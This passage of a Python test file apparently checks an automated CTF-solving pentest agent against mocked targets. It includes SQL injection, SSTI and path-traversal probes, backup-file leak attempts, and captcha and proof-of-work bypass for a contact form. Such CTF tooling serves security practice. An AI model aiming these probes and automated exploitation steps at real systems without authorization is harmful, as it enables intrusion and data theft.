    runtime = _DispatcherUnicodeNumericRuntime()
    dispatcher = CTFTaskDispatcher(
        runtime=runtime,
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )

    result = await dispatcher.run(
        target="http://ctf.local/",
        goal="拿到flag",
        type="web",
        hint="",
    )

    assert result.success is True
    assert result.flag == "flag{dispatcher_unicode_numeric_ok}"
    assert "web" in result.chain_used
    assert dispatcher.state is not None
    assert any(
        item.kind == "unicode_numeric_form_bypass" for item in dispatcher.state.hypotheses
    )
    assert any(
        record.value == "flag{dispatcher_unicode_numeric_ok}"
        for record in dispatcher.state.verified_flags
    )
    assert any(
        request[1] == "http://ctf.local/charge"
        and request[2] == {"id": "4", "price": "万"}
        for request in runtime.requests
    )
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_solves_auth_form_sqli_via_proxy_fallback(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.check",
        lambda self, tool_name: SimpleNamespace(
            available=tool_name in {"http_request", "terminal"},
            path=f"fake:{tool_name}" if tool_name in {"http_request", "terminal"} else None,
            version="test" if tool_name in {"http_request", "terminal"} else None,
            to_dict=lambda: {
                "available": tool_name in {"http_request", "terminal"},
                "path": f"fake:{tool_name}" if tool_name in {"http_request", "terminal"} else None,
                "version": "test" if tool_name in {"http_request", "terminal"} else None,
            },
        ),
    )
    set_notes_file(tmp_path / "notes_proxy_fallback.json")
    notes_module._notes.clear()

    runtime = _DispatcherProxyFallbackSQLiRuntime()
    dispatcher = CTFTaskDispatcher(
        runtime=runtime,
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )

    result = await dispatcher.run(
        target="http://ctf.local/",
        goal="拿到flag",
        type="sqli",
        hint="",
    )

    assert result.success is True
    assert result.flag == "flag{dispatcher_proxy_fallback_ok}"
    assert "sqli" in result.chain_used
    assert dispatcher.state is not None
    assert any(
        record.value == "flag{dispatcher_proxy_fallback_ok}"
        for record in dispatcher.state.verified_flags
    )
    assert dispatcher.state.pre_action_reasonings
    assert "quality=medium" in dispatcher.state.pre_action_reasonings[0]["action_rationale"]
    assert dispatcher.state.stop_report is not None
    assert dispatcher.state.stop_report["reason"] == "flag_verified"
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_does_not_repeat_same_render_surface_after_exhaustion(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_render_surface.json")
    notes_module._notes.clear()

    runtime = _DispatcherRenderSurfaceDedupeRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)

    result = await dispatcher.run(
        target="http://ctf.local/",
        goal="拿到flag",
        type="auto",
        hint="",
    )

    assert result.success is False
    assert dispatcher.state is not None
    # Phase 7: ssti_probe replaces ssti_via_render_parameter as the surface-tracking strategy
    assert any(
        item.kind == "strategy_surface_exhausted"
        and item.metadata.get("strategy_kind") == "ssti_probe"
        for item in dispatcher.state.observations
    )
    assert any(
        item.kind == "uniform_failure_surface"
        and item.metadata.get("strategy_kind") == "ssti_probe"
        for item in dispatcher.state.observations
    )
    assert dispatcher.state.stop_report is not None
    assert dispatcher.state.stop_report["reason"] == "blocked_surface_exhausted"

    # Phase 7: ssti_identify 只有在 ssti_probe 命中 "49" 后才会运行。
    # 该 mock surface 始终返回统一的 ORZ，因此只应看到 ssti_probe 的一次 {{7*7}} 请求，
    # 随后 surface 被标记 exhausted，而不是再进入 identify 阶段。
    render_probe_requests = [
        item for item in runtime.requests if "/error?msg=%7B%7B" in item
    ]
    assert len(render_probe_requests) == 1
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_reports_missing_recon_dependencies(tmp_path):
    set_notes_file(tmp_path / "notes_missing_recon.json")
    notes_module._notes.clear()

    runtime = _DispatcherMissingReconDepsRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)

    result = await dispatcher.run(
        target="http://ctf.local/",
        goal="拿到flag",
        type="sqli",
        hint="",
    )

    assert result.success is False
    assert sorted(result.missing_tools) == ["browser", "http_request"]
    assert "侦察依赖缺失" in result.reason
    assert dispatcher.state is not None
    assert dispatcher.state.detected_type is None
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_restores_rejected_flags_from_notes(tmp_path):
    set_notes_file(tmp_path / "notes_wrong_flag.json")
    notes_module._notes.clear()
    notes_module._notes["ctf_wrong_flag_runtime"] = {
        "content": "Rejected submitted flag: flag{wrong_one}",
        "category": "artifact",
        "confidence": "high",
    }

    runtime = _DispatcherMissingReconDepsRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)

    result = await dispatcher.run(
        target="http://ctf.local/",
        goal="拿到flag",
        type="sqli",
        hint="",
    )

    assert result.success is False
    assert dispatcher.state is not None
    assert dispatcher.state.is_rejected_flag("flag{wrong_one}") is True
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_phase_recon_uses_proxy_after_browser_probe_failure():
    runtime = _DispatcherBrowserProbeFallbackRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)

    features = await dispatcher._phase_recon("http://ctf.local/")

    assert runtime.browser_calls == ["diagnose"]
    assert runtime.proxy_calls[0] == "get"
    assert "request" in runtime.proxy_calls
    assert "/login" in features["html"]
    assert features["forms"]
    assert features["forms"][0]["action"].endswith("/login")
    assert any("browser_diagnose" in item for item in features["recon_errors"])


@pytest.mark.asyncio
async def test_ctf_dispatcher_phase_recon_falls_back_to_legacy_browser_runtime():
    runtime = _DispatcherLegacyBrowserRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)

    features = await dispatcher._phase_recon("http://ctf.local/")

    assert features["browser_probe"]["mode"] == "legacy_runtime"
    assert features["title"] == "EasySQL"
    assert features["forms"]
    assert features["forms"][0]["action"].endswith("/check.php")
    assert not any("browser_diagnose" in item for item in features["recon_errors"])


@pytest.mark.asyncio
async def test_ctf_dispatcher_phase_recon_bootstraps_post_auth_surface():
    runtime = _DispatcherPostAuthBootstrapRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)

    features = await dispatcher._phase_recon("http://ctf.local/")

    assert features["url"].endswith("/urlstorage")
    assert features["title"] == "URL Storage"
    assert features["auth_bootstrap"]["success"] is True
    assert any(link.endswith("/contact") for link in features["raw_links"])
    assert any("flag?token=" in link for link in features["raw_links"])
    assert "/urlstorage" in features["url"]
    assert find_auth_form(features["forms"]) is None


@pytest.mark.asyncio
async def test_ctf_dispatcher_post_auth_recon_rejects_csrf_403_surface():
    runtime = _DispatcherPostAuthBootstrapCsrfFailureRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)

    features = {
        "url": "http://ctf.local/",
        "forms": [
            {
                "action": "http://ctf.local/",
                "method": "post",
                "inputs": [
                    {"name": "username", "type": "text"},
                    {"name": "password", "type": "text"},
                    {"name": "csrfmiddlewaretoken", "type": "hidden", "value": "browser-token"},
                ],
            }
        ],
    }

    result = await dispatcher._attempt_post_auth_recon("http://ctf.local/", features)

    assert result is None
    get_calls = [item for item in runtime.proxy_calls if item[0] == "get"]
    post_calls = [item for item in runtime.proxy_calls if item[0] == "request" and item[2] == "POST"]
    assert get_calls
    assert post_calls


@pytest.mark.asyncio
async def test_ctf_dispatcher_failover_monitor_start_failure_does_not_break_run(monkeypatch, tmp_path):
    import cpa_modules.m1_api_hub as m1_api_hub

    set_notes_file(tmp_path / "notes_failover_start_fail.json")
    notes_module._notes.clear()

    async def _broken_init():
        raise RuntimeError("init failed")

    monkeypatch.setattr(m1_api_hub, "is_m1_enabled", lambda: True)
    monkeypatch.setattr(m1_api_hub, "get_failover_monitor", lambda: (_ for _ in ()).throw(RuntimeError("uninitialized")))
    monkeypatch.setattr(m1_api_hub, "init_m1", _broken_init)

    runtime = _DispatcherMissingReconDepsRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)

    result = await dispatcher.run(
        target="http://ctf.local/",
        goal="拿到flag",
        type="sqli",
        hint="",
    )

    assert result.success is False
    assert "侦察依赖缺失" in result.reason
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_stops_owned_failover_monitor_after_run(monkeypatch, tmp_path):
    import cpa_modules.m1_api_hub as m1_api_hub

    set_notes_file(tmp_path / "notes_failover_owned_stop.json")
    notes_module._notes.clear()

    monitor = _FakeOwnedFailoverMonitor()
    state = {"initialized": False}

    async def _init_m1():
        state["initialized"] = True

    def _get_failover_monitor():
        if not state["initialized"]:
            raise RuntimeError("uninitialized")
        return monitor

    monkeypatch.setattr(m1_api_hub, "is_m1_enabled", lambda: True)
    monkeypatch.setattr(m1_api_hub, "init_m1", _init_m1)
    monkeypatch.setattr(m1_api_hub, "get_failover_monitor", _get_failover_monitor)

    runtime = _DispatcherMissingReconDepsRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)

    result = await dispatcher.run(
        target="http://ctf.local/",
        goal="拿到flag",
        type="sqli",
        hint="",
    )

    assert result.success is False
    assert monitor.stop_calls == 1
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_runtime_flag_requires_verification_without_callback(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_runtime_pending.json")
    notes_module._notes.clear()

    runtime = _DispatcherSQLiRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)

    result = await dispatcher.run(
        target="http://ctf.local/",
        goal="拿到flag",
        type="sqli",
        hint="",
    )

    assert result.success is False
    assert "runtime flag 但尚未 verified" in result.reason
    assert dispatcher.state is not None
    assert [record.value for record in dispatcher.state.runtime_flags] == [
        "flag{dispatcher_sqli_ok}"
    ]
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_auto_verifies_runtime_flag_for_local_challenge_hint(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    challenge_dir = tmp_path / "easy_login_local_verify"
    challenge_dir.mkdir()
    (challenge_dir / "docker-compose.yml").write_text(
        "services:\n  app:\n    image: easy_login-app\n", encoding="utf-8"
    )
    set_notes_file(tmp_path / "notes_runtime_local_verified.json")
    notes_module._notes.clear()

    runtime = _DispatcherSQLiRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)

    result = await dispatcher.run(
        target="http://ctf.local/",
        goal="拿到flag",
        type="sqli",
        hint=f"[local_ctf_assets]\nchallengePath={challenge_dir}",
    )

    assert result.success is True
    assert result.flag == "flag{dispatcher_sqli_ok}"
    assert dispatcher.state is not None
    assert dispatcher.state.local_challenge_auto_verify is True
    assert [record.value for record in dispatcher.state.verified_flags] == [
        "flag{dispatcher_sqli_ok}"
    ]
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_auto_submit_rejection_triggers_wrong_flag_recovery(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_submit_reject.json")
    notes_module._notes.clear()

    memory_store = StrategyMemoryStore(tmp_path / "strategy_memory_submit_reject.json")
    await memory_store.save(
        StrategyMemoryEntry(
            id="mem_seed",
            fingerprint=ChallengeFingerprint(
                tech_stack=["web"],
                auth_mechanism="form_login",
                detected_type="sqli",
                has_login_form=True,
                platform="ctf.local",
            ),
            winning_hypothesis_kinds=["auth_form_sqli"],
            failed_hypothesis_kinds=["generic_web_recon"],
            solved=True,
            metadata=StrategyMemoryEntryMetadata(
                created_at=1e12,
                manual_status="active",
                applied_count=6,
                successful_applications=1,
                success_correlation=1.0,
            ),
        )
    )
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.StrategyMemoryStore",
        lambda: memory_store,
    )

    runtime = _DispatcherSQLiSubmitRejectRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)

    result = await dispatcher.run(
        target="http://ctf.local/",
        goal="拿到flag",
        type="sqli",
        hint="",
        submit_profile={
            "endpoint": "http://submit.local/flag",
            "failure_pattern": r"(wrong|incorrect|invalid|错误)",
        },
    )

    assert result.success is False
    assert "wrong flag feedback" in result.reason
    assert dispatcher.state is not None
    assert dispatcher.state.stop_report is not None
    assert dispatcher.state.stop_report["reason"] == "wrong_flag_feedback"
    assert any(
        isinstance(item, dict)
        and item.get("type") == "strategy_memory_wrong_flag_audit"
        and item.get("wrong_flag") == "flag{dispatcher_sqli_ok}"
        for item in dispatcher.state.meta_reasonings
    )
    assert any(
        record.value == "flag{dispatcher_sqli_ok}"
        for record in dispatcher.state.rejected_flags
    )
    rejected = next(
        record for record in dispatcher.state.rejected_flags if record.value == "flag{dispatcher_sqli_ok}"
    )
    assert rejected.proof is not None
    assert rejected.proof.strategy_kind == "auth_form_sqli"
    assert rejected.proof.hypothesis_id == "auth_form_sqli"
    assert "wrong flag feedback: flag{dispatcher_sqli_ok}" in dispatcher.state.weak_decision_log
    assert any(
        obs.kind == "wrong_flag_feedback" and obs.value == "flag{dispatcher_sqli_ok}"
        for obs in dispatcher.state.observations
    )
    assert any(
        isinstance(item, dict)
        and item.get("type") == "hypothesis_wrong_flag_feedback"
        and item.get("proof_strategy_kind") == "auth_form_sqli"
        for item in dispatcher.state.meta_reasonings
    )
    updated = await memory_store.get_entry("mem_seed")
    assert updated is not None
    assert updated.metadata.manual_status == "muted"
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_records_platform_profile_and_sync_snapshot(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_platform_snapshot.json")
    notes_module._notes.clear()

    async def _fake_snapshot(platform_type: str = "manual", **kwargs):
        assert platform_type == "ctfd"
        assert kwargs["base_url"] == "https://ctf.example.com"
        return {
            "success": True,
            "platform_type": "ctfd",
            "base_url": "https://ctf.example.com",
            "supports_submit": True,
            "challenge_count": 12,
            "scoreboard_keys": ["data", "scoreboard"],
        }

    monkeypatch.setattr(
        "cpa_modules.m2_ctf_kit.flag_submitter.get_platform_snapshot",
        _fake_snapshot,
    )

    runtime = _DispatcherMissingReconDepsRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)

    result = await dispatcher.run(
        target="https://ctf.example.com/challenges/42?cid=42",
        goal="拿到flag",
        type="sqli",
        hint="",
        submit_profile={
            "platform_type": "ctfd",
            "base_url": "https://ctf.example.com",
            "auto_submit": True,
        },
    )

    assert result.success is False
    assert dispatcher.state is not None
    assert any(
        isinstance(item, dict)
        and item.get("type") == "platform_profile_snapshot"
        and item.get("challenge_id") == "42"
        for item in dispatcher.state.meta_reasonings
    )
    assert any(
        isinstance(item, dict)
        and item.get("type") == "platform_sync_snapshot"
        and item.get("challenge_count") == 12
        for item in dispatcher.state.meta_reasonings
    )
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_aligns_platform_challenge_and_stops_if_already_solved(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_platform_solved.json")
    notes_module._notes.clear()

    async def _fake_snapshot(platform_type: str = "manual", **kwargs):
        return {
            "success": True,
            "platform_type": "ctfd",
            "base_url": "https://ctf.example.com",
            "supports_submit": True,
            "challenge_count": 1,
            "scoreboard_keys": ["data"],
            "challenge_briefs": [
                {
                    "id": "42",
                    "name": "EasySQL",
                    "status": "solved",
                    "solved": True,
                    "category": "web",
                }
            ],
        }

    monkeypatch.setattr(
        "cpa_modules.m2_ctf_kit.flag_submitter.get_platform_snapshot",
        _fake_snapshot,
    )

    runtime = _DispatcherSQLiRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)

    result = await dispatcher.run(
        target="https://ctf.example.com/challenges/42?cid=42",
        goal="拿到flag",
        type="sqli",
        hint="",
        submit_profile={
            "platform_type": "ctfd",
            "base_url": "https://ctf.example.com",
            "auto_submit": True,
        },
    )

    assert result.success is False
    assert "already solved" in result.reason
    assert dispatcher.state is not None
    assert any(
        isinstance(item, dict)
        and item.get("type") == "platform_challenge_alignment"
        and item.get("already_solved") is True
        and item.get("challenge_id") == "42"
        for item in dispatcher.state.meta_reasonings
    )
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


def test_ctf_dispatcher_collect_candidate_filenames_extracts_sentence_style_paths():
    dispatcher = CTFTaskDispatcher(runtime=_DispatcherMissingReconDepsRuntime(), progress_callback=None)
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")
    dispatcher.state.add_observation(
        "hint_text",
        "flag in /fllllllllllllag ; cat /flag_is_here 查看 ; real file is /flag.final",
        source="hint_chain_followup",
    )

    candidates = dispatcher._collect_candidate_filenames()

    assert "/fllllllllllllag" in candidates
    assert "/flag_is_here" in candidates
    assert "/flag.final" in candidates


def test_ctf_dispatcher_extract_flag_ignores_css_selector_false_positive():
    dispatcher = CTFTaskDispatcher(runtime=_DispatcherMissingReconDepsRuntime(), progress_callback=None)
    css_blob = "summary{display:block}.container{margin:0 auto}"
    css_blob2 = "video{display:inline-block}.container{margin:0 auto}"
    css_blob3 = "template{display:none}.container{margin:0 auto}"
    css_blob4 = "before{box-sizing:inherit}"
    css_blob5 = '<link rel="stylesheet" href="/static/css/milligram.min.css">before{box-sizing:inherit}'

    assert dispatcher._extract_flag(css_blob) is None
    assert dispatcher._extract_flag(css_blob2) is None
    assert dispatcher._extract_flag(css_blob3) is None
    assert dispatcher._extract_flag(css_blob4) is None
    assert dispatcher._extract_flag(css_blob5) is None
    assert dispatcher._extract_flag("Login Success! flag{dispatcher_css_guard_ok}") == "flag{dispatcher_css_guard_ok}"


def test_ctf_dispatcher_exploration_agenda_filters_css_and_html_noise():
    dispatcher = CTFTaskDispatcher(runtime=_DispatcherMissingReconDepsRuntime(), progress_callback=None)
    dispatcher.state = CTFState(target="http://ctf.local/urlstorage", goal="拿到flag")

    features = {
        "url": "http://ctf.local/urlstorage",
        "raw_links": [
            "http://ctf.local/contact",
            "http://ctf.local/static/css/milligram.min.css",
            "https://shiamotivate.me/",
        ],
        "endpoints": [
            "/contact",
            "/label",
            "/title",
            "/shiamotivate.me",
            "/static/css/milligram.min.css",
        ],
    }

    dispatcher._populate_exploration_agenda_from_recon("http://ctf.local/urlstorage", features)

    agenda = {item.url_or_path for item in dispatcher.state.exploration_agenda}
    assert "http://ctf.local/contact" in agenda
    assert "/contact" in agenda or "http://ctf.local/contact" in agenda
    assert "http://ctf.local/static/css/milligram.min.css" not in agenda
    assert "https://shiamotivate.me/" not in agenda
    assert "/label" not in agenda
    assert "/title" not in agenda
    assert "/shiamotivate.me" not in agenda


def test_auth_success_change_does_not_treat_mere_response_diff_as_success():
    from pentestagent.agents.pa_agent.ctf_dispatcher import (
        _looks_like_successful_auth_change,
    )

    baseline = {
        "status_code": 200,
        "headers": {},
        "body": "invalid user name or password",
        "final_url": "http://ctf.local/index.php",
        "redirect_history": [],
    }
    changed = {
        "status_code": 200,
        "headers": {},
        "body": "username does not exist",
        "final_url": "http://ctf.local/index.php",
        "redirect_history": [],
    }

    assert _looks_like_successful_auth_change(changed, baseline) is False


def test_auth_success_change_accepts_redirect_or_cookie_success_signals():
    from pentestagent.agents.pa_agent.ctf_dispatcher import (
        _looks_like_successful_auth_change,
    )

    baseline = {
        "status_code": 200,
        "headers": {},
        "body": "invalid user name or password",
        "final_url": "http://ctf.local/index.php",
        "redirect_history": [],
    }
    redirected = {
        "status_code": 200,
        "headers": {},
        "body": "please wait",
        "final_url": "http://ctf.local/profile.php",
        "redirect_history": [{"status_code": 302, "url": "http://ctf.local/index.php", "location": "/profile.php"}],
    }
    cookie_only = {
        "status_code": 200,
        "headers": {"set-cookie": "PHPSESSID=demo; Path=/"},
        "body": "ok",
        "final_url": "http://ctf.local/index.php",
        "redirect_history": [],
    }

    assert _looks_like_successful_auth_change(redirected, baseline) is True
    assert _looks_like_successful_auth_change(cookie_only, baseline) is True


@pytest.mark.asyncio
async def test_ctf_dispatcher_tornado_ssti_uses_distinct_surface_key(monkeypatch, tmp_path):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_tornado_ssti.json")
    notes_module._notes.clear()

    runtime = _DispatcherRenderSurfaceDedupeRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")
    exhausted_signature = dispatcher._strategy_surface_signature(
        "ssti_via_render_parameter",
        ["http://ctf.local/error?msg=Error"],
    )
    dispatcher.state.add_observation(
        "strategy_surface_exhausted",
        "ssti_via_render_parameter",
        source="dispatcher",
        metadata={
            "strategy_kind": "ssti_via_render_parameter",
            "signature": exhausted_signature,
        },
    )

    outcome = await dispatcher._run_tornado_ssti_strategy(
        "http://ctf.local/",
        {"raw_links": []},
    )

    assert "already exhausted" not in str(outcome.reason or "")
    assert any(
        item.kind == "strategy_surface_exhausted"
        and item.metadata.get("strategy_kind") == "tornado_ssti"
        for item in dispatcher.state.observations
    )
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_backup_source_leak_probes_django_static_confusion_paths(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_static_source_leak.json")
    notes_module._notes.clear()

    runtime = _DispatcherStaticSourceLeakRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)

    outcome = await dispatcher._run_backup_source_leak_strategy(
        "http://ctf.local/",
        {},
        "",
    )

    assert outcome.progress is True
    assert "http://ctf.local/static../views.py" in runtime.requests
    assert "ctf_backup_candidate" in notes_module._notes
    assert (
        "http://ctf.local/static../views.py"
        in notes_module._notes["ctf_backup_candidate"]["content"]
    )
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_backup_source_leak_prefers_app_py_candidates_from_local_source_hints(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_source_hint_backup.json")
    notes_module._notes.clear()

    runtime = _DispatcherSourceHintAwareBackupRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag", detected_type="web")
    dispatcher.state.add_observation(
        "local_challenge_source_hint",
        "app.py: @app.route('/admin')",
        source="local_challenge_context",
        metadata={"path": r"D:\webstudy\CTF\easy_login\app.py"},
    )

    outcome = await dispatcher._run_backup_source_leak_strategy(
        "http://ctf.local/",
        {},
        "",
    )

    assert outcome.progress is True
    assert runtime.requests
    assert runtime.requests[0] == "http://ctf.local/app.py.bak"
    assert "http://ctf.local/app.py.bak" in runtime.requests
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_contact_report_chain_records_captcha_blocker(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_contact_report.json")
    notes_module._notes.clear()

    runtime = _DispatcherContactReportRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")

    outcome = await dispatcher._run_contact_report_chain_strategy(
        "http://ctf.local/",
        {
            "raw_links": [
                "http://ctf.local/contact",
                "http://ctf.local/flag?token=deadbeefdeadbeefdeadbeefdeadbeef",
            ],
            "endpoints": ["/contact"],
        },
    )

    assert outcome.progress is True
    assert "contact blocked: invalid captcha" in outcome.reason
    assert ("get", "http://ctf.local/contact", None) in runtime.requests
    assert ("request", "http://ctf.local/contact", "POST") in runtime.requests
    assert any("ctf_contact_blocker" in item for item in dispatcher._notes_log)
    assert any(
        item.kind == "uniform_failure_surface"
        and item.metadata.get("strategy_kind") == "contact_report_chain"
        and "invalid captcha" in item.metadata.get("reason", "")
        for item in dispatcher.state.observations
    )
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_contact_report_chain_prefers_real_contact_over_login_next_page(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_contact_prefer_real.json")
    notes_module._notes.clear()

    runtime = _DispatcherContactReportPrefersActualContactRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")

    outcome = await dispatcher._run_contact_report_chain_strategy(
        "http://ctf.local/",
        {
            "raw_links": [
                "http://ctf.local/flag?token=deadbeefdeadbeefdeadbeefdeadbeef",
            ],
            "endpoints": [],
        },
    )

    assert outcome.progress is True
    assert "contact blocked: invalid captcha" in outcome.reason
    assert ("get", "http://ctf.local/contact", None) in runtime.requests
    assert any(
        item.kind == "contact_surface"
        and item.value == "http://ctf.local/contact"
        for item in dispatcher.state.observations
    )
    assert not any(
        item.kind == "contact_surface"
        and "?next=/flag" in item.value
        for item in dispatcher.state.observations
    )
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_contact_report_chain_uses_captcha_and_pow_solvers(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )

    async def _fake_captcha_solver(runtime, contact_html, contact_url):
        return 15

    def _fake_pow_solver(challenge):
        return 0

    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher._solve_contact_captcha_solution",
        _fake_captcha_solver,
    )
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher._solve_contact_pow_solution",
        _fake_pow_solver,
    )
    set_notes_file(tmp_path / "notes_contact_solved.json")
    notes_module._notes.clear()

    runtime = _DispatcherContactReportSolvedRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)
    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag")

    outcome = await dispatcher._run_contact_report_chain_strategy(
        "http://ctf.local/",
        {"raw_links": [], "endpoints": ["/contact"]},
    )

    assert outcome.progress is True
    assert outcome.reason == "contact/report form submitted"
    assert any(
        action == "request"
        and method == "POST"
        and url == "http://ctf.local/contact"
        and data.get("captcha_0") == "aa04b5dac66c9b9e258649792892e6a8e4df63ee"
        and data.get("captcha_1") == "15"
        and data.get("pow") == "0"
        for action, url, method, data in runtime.requests
    )
    assert any(
        item.kind == "contact_captcha_solved" and item.value == "15"
        for item in dispatcher.state.observations
    )
    assert any(
        item.kind == "contact_pow_solved" and item.value == "0"
        for item in dispatcher.state.observations
    )
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_contact_report_chain_treats_urlstorage_return_as_success_after_captcha_bypass(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )

    async def _no_captcha_solver(runtime, contact_html, contact_url):
        return None

    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher._solve_contact_captcha_solution",
        _no_captcha_solver,
    )
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher._solve_contact_pow_solution",
        lambda challenge: None,
    )
    set_notes_file(tmp_path / "notes_contact_bypass.json")
    notes_module._notes.clear()

    runtime = _DispatcherContactReportBypassRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)
